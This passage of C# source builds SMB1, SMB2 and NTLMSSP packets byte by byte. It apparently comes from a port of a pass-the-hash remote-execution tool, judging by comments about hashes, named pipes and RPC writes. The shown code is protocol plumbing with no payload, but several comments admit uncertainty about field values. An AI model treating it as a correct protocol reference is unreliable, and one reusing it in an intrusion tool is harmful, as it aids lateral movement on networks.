            //https://msdn.microsoft.com/en-us/library/ee441849.aspx


            byte[] packet_byte_count = BitConverter.GetBytes(packet_security_blob.Length);
            byte[] packet_byte_count2 = { packet_byte_count[0], packet_byte_count[1] }; //Line 164, need to figure out what this means and what exactly it does.
            byte[] packet_security_blob_length = BitConverter.GetBytes(packet_security_blob.Length + 5);
            byte[] packet_security_blob_length2 = { packet_security_blob_length[0], packet_security_blob_length[1] }; //Does this mean that the two indices are added together or appended. May just need to do an "add" here.

           OrderedDictionary packet_SMBSessionSetupAndXRequest = new OrderedDictionary();
           //The value of WordCount must be 0x0D, but for some reason Kevin set this to 0x0c...I wonder why.
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_WordCount", new byte[] { 0x0c });
           //This value must either be the command code for the next SMB command in the packet or 0xFF
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXCommand", new byte[] { 0xff });
           //Reserved field, must be set to 0x00
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved", new byte[] { 0x00 });
           //This field MUST be set to the offset in bytes from the start of the SMB Header to the start of the WordCount field in the next SMB command in this packet. This field is valid only if the AndXCommand field is not set to 0xFF. If AndXCommand is 0xFF, this field MUST be ignored by the server.
           //In our case, we set 0xff for AndXCommand so we're going to set this value to 0x00
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_AndXOffset",new byte[] { 0x00, 0x00 });
           //The largest buffer size that the client can receive.
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxBuffer",new byte[] { 0xff, 0xff });
           //Maximum number of pending requests supported by the client. Must be less than or equal to to the MaxMpxCount provided by the server.
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_MaxMpxCount",new byte[] { 0x02, 0x00 });
           //The number of VC (Virtual Circuits) between the client and the server.
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_VCNumber",new byte[] { 0x01, 0x00 });
           //The client MUST set this field to be equal to the SessionKey field in the SMB_COM_NEGOTIATE Response for this SMB connection 
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SessionKey",new byte[] { 0x00, 0x00, 0x00, 0x00 });
           //Combination of OEM Password Length and Unicode Password Length which contain the contents of SMB_Data.OEMPassword and SMB_Data.UnicodePassword fields.
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlobLength", packet_byte_count2);
           // 4 bytes reserved, must be set to 0x00000000
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Reserved2",new byte[] { 0x00, 0x00, 0x00, 0x00 });
           //A 32 - bit field providing a set of client capability indicators. We set, 
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_Capabilities",new byte[] { 0x44, 0x00, 0x00, 0x80 });
           //The number of bytes in the SMB_Data.bytes array.
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_ByteCount", packet_security_blob_length2);
           //Password blob, same as the above packet. (Is this where the hash is stored?)
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_SecurityBlob", packet_security_blob);
            //A string representing the native OS of the CIFS client
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeOS",new byte[] { 0x00, 0x00, 0x00 });
           // A string that represents the Native Lan Managertype of the client.
           packet_SMBSessionSetupAndXRequest.Add("SMBSessionSetupAndXRequest_NativeLANManage",new byte[] { 0x00, 0x00 });

            return packet_SMBSessionSetupAndXRequest;
        }
        private static OrderedDictionary GetPacketSMBTreeConnectAndXRequest(byte[] packet_path)
        {
            byte[] packet_path_length = BitConverter.GetBytes(packet_path.Length + 7);
            packet_path_length = new byte[] { packet_path_length[0], packet_path_length[1] };

            OrderedDictionary packet_SMBTreeConnectAndXRequest = new OrderedDictionary();
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_WordCount", new byte[] { 0x04 });
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXCommand", new byte[] { 0xff});
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Reserved", new byte[] { 0x00 });
            //AndXCommand above was set to 0xff so this gets ignored by the server.
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXOffset",new byte[] { 0x00, 0x00 });
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Flags",new byte[] { 0x00, 0x00 });
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_PasswordLength",new byte[] { 0x01, 0x00 });
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_ByteCount",packet_path_length);
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Password",new byte[] { 0x00 });
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Tree",packet_path);
            packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Service",new byte[] { 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00 });

            return packet_SMBTreeConnectAndXRequest;
        }
        private static OrderedDictionary GetPacketSMBNTCreateAndXRequest(byte[] packet_named_pipe)
        {
            byte[] packet_named_pipe_length = BitConverter.GetBytes(packet_named_pipe.Length);
            byte[] packet_named_pipe_length2 = { packet_named_pipe_length[0], packet_named_pipe_length[1] };
            byte[] packet_file_name_length = BitConverter.GetBytes(packet_named_pipe.Length - 1);
            byte[] packet_file_name_length2 = { packet_file_name_length[0], packet_file_name_length[1] };

            OrderedDictionary packet_SMBNTCreateAndXRequest = new OrderedDictionary();
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_WordCount", new byte[] {0x18});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXCommand",new byte[] {0xff});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved",new byte[] {0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXOffset",new byte[] {0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved2",new byte[] {0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileNameLen", packet_file_name_length2);
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateFlags",new byte[] {0x16,0x00,0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_RootFID",new byte[] {0x00,0x00,0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AccessMask",new byte[] {0x00,0x00,0x00,0x02});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AllocationSize",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileAttributes",new byte[] {0x00,0x00,0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ShareAccess",new byte[] {0x07,0x00,0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Disposition",new byte[] {0x01,0x00,0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateOptions",new byte[] {0x00,0x00,0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Impersonation",new byte[] {0x02,0x00,0x00,0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_SecurityFlags",new byte[] {0x00});
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ByteCount",packet_named_pipe_length2);
            packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Filename",packet_named_pipe);
 
            return packet_SMBNTCreateAndXRequest;
        }
        private static OrderedDictionary GetPacketSMBReadAndXRequest()
        {
            OrderedDictionary packet_SMBReadAndXRequest = new OrderedDictionary();
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_WordCount",new byte[] {0x0a});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXCommand",new byte[] {0xff});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Reserved",new byte[] {0x00});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXOffset",new byte[] {0x00, 0x00});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_FID",new byte[] {0x00, 0x40});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Offset",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MaxCountLow",new byte[] {0x58, 0x02});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MinCount",new byte[] {0x58, 0x02});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Unknown",new byte[] {0xff, 0xff, 0xff, 0xff});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Remaining",new byte[] {0x00, 0x00});
            packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_ByteCount",new byte[] {0x00, 0x00});

            return packet_SMBReadAndXRequest;
        }
        private static OrderedDictionary GetPacketSMBWriteAndXRequest(byte[] packet_file_ID, int packet_RPC_length)
        {
            byte[] packet_write_length = BitConverter.GetBytes(packet_RPC_length);
            packet_write_length = new byte[] { packet_write_length[0], packet_write_length[1] };

            OrderedDictionary packet_SMBWriteAndXRequest = new OrderedDictionary();
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WordCount",new byte[] {0x0e});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXCommand",new byte[] {0xff});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved",new byte[] {0x00});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXOffset",new byte[] {0x00, 0x00});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_FID", packet_file_ID);
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Offset",new byte[] {0xea, 0x03, 0x00, 0x00});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved2",new byte[] {0xff, 0xff, 0xff, 0xff});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WriteMode",new byte[] {0x08, 0x00});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Remaining", packet_write_length);
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthHigh",new byte[] {0x00, 0x00});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthLow", packet_write_length);
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataOffset",new byte[] {0x3f, 0x00});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_HighOffset",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_ByteCount",packet_write_length);

            return packet_SMBWriteAndXRequest;
        }
        private static OrderedDictionary GetPacketSMBCloseRequest(byte[] packet_file_ID)
        {

            OrderedDictionary packet_SMBCloseRequest = new OrderedDictionary();
            packet_SMBCloseRequest.Add("SMBCloseRequest_WordCount",new byte[] {0x03});
            packet_SMBCloseRequest.Add("SMBCloseRequest_FID",packet_file_ID);
            packet_SMBCloseRequest.Add("SMBCloseRequest_LastWrite",new byte[] {0xff, 0xff, 0xff, 0xff});
            packet_SMBCloseRequest.Add("SMBCloseRequest_ByteCount",new byte[] {0x00, 0x00});

            return packet_SMBCloseRequest;
        }
        private static OrderedDictionary GetPacketSMBTreeDisconnectRequest()
        {
            OrderedDictionary packet_SMBTreeDisconnectRequest = new OrderedDictionary();
            packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_WordCount",new byte[] {0x00});
            packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_ByteCount",new byte[] {0x00, 0x00});
            return packet_SMBTreeDisconnectRequest;
        }
        private static OrderedDictionary GetPacketSMBLogoffAndXRequest()
        {
            OrderedDictionary packet_SMBLogoffAndXRequest = new OrderedDictionary();
            packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_WordCount", new byte[] { 0x02});
            packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXCommand", new byte[] { 0xff});
            packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_Reserved", new byte[] {0x00 });
            packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXOffset", new byte[] {0x00,0x00 });
            packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_ByteCount", new byte[] { 0x00,0x00});
            return packet_SMBLogoffAndXRequest;
        }

        //SMB2
        private static OrderedDictionary GetPacketSMB2Header(byte[] packet_command, int packet_message_ID, byte[] packet_tree_ID, byte[] packet_session_ID)
        {
            byte[] initbytes = BitConverter.GetBytes(packet_message_ID);
            byte[] packet_message_ID2 =CombineByteArray(initbytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });


            OrderedDictionary packet_SMB2Header = new OrderedDictionary();
            packet_SMB2Header.Add("SMB2Header_ProtocolID", new byte[] {0xfe,0x53,0x4d,0x42});
            packet_SMB2Header.Add("SMB2Header_StructureSize",new byte[] {0x40,0x00});
            packet_SMB2Header.Add("SMB2Header_CreditCharge",new byte[] {0x01,0x00});
            packet_SMB2Header.Add("SMB2Header_ChannelSequence",new byte[] {0x00,0x00});
            packet_SMB2Header.Add("SMB2Header_Reserved",new byte[] {0x00,0x00});
            packet_SMB2Header.Add("SMB2Header_Command", packet_command);
            packet_SMB2Header.Add("SMB2Header_CreditRequest",new byte[] {0x00,0x00});
            packet_SMB2Header.Add("SMB2Header_Flags",new byte[] {0x00,0x00,0x00,0x00});
            packet_SMB2Header.Add("SMB2Header_NextCommand",new byte[] {0x00,0x00,0x00,0x00});
            packet_SMB2Header.Add("SMB2Header_MessageID", packet_message_ID2);
            packet_SMB2Header.Add("SMB2Header_Reserved2",new byte[] {0x00,0x00,0x00,0x00});
            packet_SMB2Header.Add("SMB2Header_TreeID", packet_tree_ID);
            packet_SMB2Header.Add("SMB2Header_SessionID", packet_session_ID);
            packet_SMB2Header.Add("SMB2Header_Signature",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});

            return packet_SMB2Header;

        }
        private static OrderedDictionary GetPacketSMB2NegotiateProtocolRequest()
        {
            OrderedDictionary packet_SMB2NegotiateProtocolRequest = new OrderedDictionary();
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_StructureSize",new byte[] {0x24, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_DialectCount",new byte[] {0x02, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_SecurityMode",new byte[] {0x01, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved",new byte[] {0x00, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Capabilities",new byte[] {0x40, 0x00, 0x00, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_ClientGUID",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",new byte[] {0x00, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved2",new byte[] {0x00, 0x00});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect",new byte[] {0x02, 0x02});
            packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect2",new byte[] {0x10, 0x02});

            return packet_SMB2NegotiateProtocolRequest;
        }

        private static OrderedDictionary GetPacketSMB2SessionSetupRequest(byte[] packet_security_blob)
        {
            byte[] packet_security_blob_length = BitConverter.GetBytes(packet_security_blob.Length);
            byte[] packet_security_blob_length2 = { packet_security_blob_length[0], packet_security_blob_length[1] };

            OrderedDictionary packet_SMB2SessionSetupRequest = new OrderedDictionary();
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_StructureSize",new byte[] {0x19, 0x00});
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Flags",new byte[] {0x00});
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityMode",new byte[] {0x01});
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Capabilities",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Channel",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferOffset",new byte[] {0x58, 0x00});
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferLength", packet_security_blob_length2);
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_PreviousSessionID",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00});
            packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Buffer", packet_security_blob);

            return packet_SMB2SessionSetupRequest;
        }

        private static OrderedDictionary GetPacketSMB2TreeConnectRequest(byte[] packet_path)
        {

            byte[] packet_path_length = BitConverter.GetBytes(packet_path.Length);
            packet_path_length = new byte[] { packet_path_length[0], packet_path_length[1] };
            OrderedDictionary packet_SMB2TreeConnectRequest = new OrderedDictionary();
            packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_StructureSize",new byte[] {0x09, 0x00});
            packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Reserved",new byte[] {0x00, 0x00});
            packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathOffset",new byte[] {0x48, 0x00});
            packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathLength", packet_path_length);
            packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Buffer", packet_path);

            return packet_SMB2TreeConnectRequest;
        }

        private static OrderedDictionary GetPacketSMB2CreateRequestFile(byte[] packet_named_pipe)
        {
            byte[] packet_named_pipe_length = BitConverter.GetBytes(packet_named_pipe.Length);
            byte[] packet_named_pipe_length2 = { packet_named_pipe_length[0], packet_named_pipe_length[1] };
            OrderedDictionary packet_SMB2CreateRequestFile = new OrderedDictionary();
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_StructureSize",new byte[] {0x39, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Flags",new byte[] {0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_RequestedOplockLevel",new byte[] {0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Impersonation",new byte[] {0x02, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_SMBCreateFlags",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Reserved",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_DesiredAccess",new byte[] {0x03, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_FileAttributes",new byte[] {0x80, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_ShareAccess",new byte[] {0x01, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateDisposition",new byte[] {0x01, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateOptions",new byte[] {0x40, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameOffset",new byte[] {0x78, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameLength", packet_named_pipe_length2);
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsOffset",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsLength",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Buffer", packet_named_pipe);

            return packet_SMB2CreateRequestFile;

        }
        private static OrderedDictionary GetPacketSMB2ReadRequest(byte[] packet_file_ID)
        {
            OrderedDictionary packet_SMB2ReadRequest = new OrderedDictionary();
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_StructureSize",new byte[] {0x31, 0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_Padding",new byte[] {0x50});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_Flags",new byte[] {0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_Length",new byte[] {0x00, 0x00, 0x10, 0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_Offset",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_FileID", packet_file_ID);
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_MinimumCount",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_Channel",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_RemainingBytes",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoOffset",new byte[] {0x00, 0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoLength",new byte[] {0x00, 0x00});
            packet_SMB2ReadRequest.Add("SMB2ReadRequest_Buffer",new byte[] {0x30});

            return packet_SMB2ReadRequest;
        }
        private static OrderedDictionary GetPacketSMB2WriteRequest(byte[] packet_file_ID, int packet_RPC_length)
        {


            byte[] packet_write_length = BitConverter.GetBytes(packet_RPC_length);
            OrderedDictionary packet_SMB2WriteRequest = new OrderedDictionary();
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_StructureSize",new byte[] {0x31, 0x00});
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_DataOffset",new byte[] {0x70, 0x00});
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_Length", packet_write_length);
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_Offset",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00});
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_FileID", packet_file_ID);
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_Channel",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_RemainingBytes",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoOffset",new byte[] {0x00, 0x00});
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoLength",new byte[] {0x00, 0x00});
            packet_SMB2WriteRequest.Add("SMB2WriteRequest_Flags",new byte[] {0x00, 0x00, 0x00, 0x00});


            return packet_SMB2WriteRequest;
        }

        private static OrderedDictionary GetPacketSMB2CloseRequest(byte[] packet_file_ID)
        {
            OrderedDictionary packet_SMB2CloseRequest = new OrderedDictionary();
            packet_SMB2CloseRequest.Add("SMB2CloseRequest_StructureSize",new byte[] {0x18, 0x00});
            packet_SMB2CloseRequest.Add("SMB2CloseRequest_Flags",new byte[] {0x00, 0x00});
            packet_SMB2CloseRequest.Add("SMB2CloseRequest_Reserved",new byte[] {0x00, 0x00, 0x00, 0x00});
            packet_SMB2CloseRequest.Add("SMB2CloseRequest_FileID", packet_file_ID);
            return packet_SMB2CloseRequest;
        }
        private static OrderedDictionary GetPacketSMB2TreeDisconnectRequest()
        {
            OrderedDictionary packet_SMB2TreeDisconnectRequest = new OrderedDictionary();
            packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_StructureSize",new byte[] {0x04, 0x00});
            packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_Reserved",new byte[] {0x00, 0x00});
            return packet_SMB2TreeDisconnectRequest;
        }

        private static OrderedDictionary GetPacketSMB2SessionLogoffRequest()
        {
            OrderedDictionary packet_SMB2SessionLogoffRequest = new OrderedDictionary();
            packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_StructureSize",new byte[] {0x04, 0x00});
            packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_Reserved",new byte[] {0x00, 0x00});
            return packet_SMB2SessionLogoffRequest;
        }
        //NTLM
        private static OrderedDictionary GetPacketNTLMSSPNegotiate(byte[] packet_negotiate_flags, byte[] packet_version)
        {
            byte[] packet_NTLMSSP_length;
            //There may be issues here, we will see.
            if (packet_version != null)
            {
                packet_NTLMSSP_length = BitConverter.GetBytes(32 + packet_version.Length);
            }
            else
            {
                packet_NTLMSSP_length = BitConverter.GetBytes(32);
            }
            byte[] packet_NTLMSSP_length2 = { packet_NTLMSSP_length[0] };

            int packet_ASN_length_1 = Convert.ToInt32(packet_NTLMSSP_length[0]) + 32;
            byte[] packet_ASN_length_1_2 = (BitConverter.GetBytes(packet_ASN_length_1));

            int packet_ASN_length_2 = Convert.ToInt32(packet_NTLMSSP_length[0]) + 22;
            byte[] packet_ASN_length_2_2 = (BitConverter.GetBytes(packet_ASN_length_2));

            int packet_ASN_length_3 = Convert.ToInt32(packet_NTLMSSP_length[0]) + 20;
            byte[] packet_ASN_length_3_2 = (BitConverter.GetBytes(packet_ASN_length_3));

            int packet_ASN_length_4 = Convert.ToInt32(packet_NTLMSSP_length[0]) + 2;
            byte[] packet_ASN_length_4_2 = BitConverter.GetBytes(packet_ASN_length_4);


            OrderedDictionary packet_NTLMSSPNegotiate = new OrderedDictionary();
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialContextTokenID", new byte[] { 0x60 }); // the ASN.1 key names are likely not all correct
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength", new byte[] { packet_ASN_length_1_2[0] });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechID", new byte[] { 0x06 });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechLength", new byte[] { 0x06 });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_OID", new byte[] { 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02 });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID", new byte[] { 0xa0 });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength", new byte[] { packet_ASN_length_2_2[0] });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",new byte[] {0x30});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2", new byte[] { packet_ASN_length_3_2[0] });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID",new byte[] {0xa0});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength",new byte[] {0x0e});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID2",new byte[] {0x30});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength2",new byte[] {0x0c});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID3",new byte[] {0x06});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength3",new byte[] {0x0a});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechType",new byte[] {0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenID",new byte[] {0xa2});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenLength", new byte[] { packet_ASN_length_4_2[0] });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPID",new byte[] {0x04});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPLength", new byte[] { packet_NTLMSSP_length2[0] });
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Identifier",new byte[] {0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MessageType",new byte[] {0x01,0x00,0x00,0x00});
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NegotiateFlags", packet_negotiate_flags);
            packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00});
